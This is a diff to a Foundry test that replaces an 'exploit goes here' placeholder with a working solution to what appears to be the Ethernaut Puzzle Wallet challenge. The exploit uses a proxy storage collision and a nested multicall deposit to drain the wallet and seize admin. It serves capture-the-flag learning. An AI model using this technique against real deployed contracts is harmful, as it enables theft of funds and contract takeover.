@@ -29,7 +29,19 @@ contract TestPuzzleWallet is Test {
 
         vm.startPrank(player);
 
-        // Your exploit goes here
+        proxy.proposeNewAdmin(player);
+        instance.addToWhitelist(player);
+
+        bytes[] memory multicalldata = new bytes[](1);
+        multicalldata[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+
+        bytes[] memory data = new bytes[](2);
+        data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, multicalldata);
+
+        instance.multicall{value: 0.001 ether}(data);
+        instance.execute(player, 0.002 ether, "");
+        instance.setMaxBalance(uint256(uint160(player)));
 
         vm.stopPrank();
         assertEq(proxy.admin(), player);
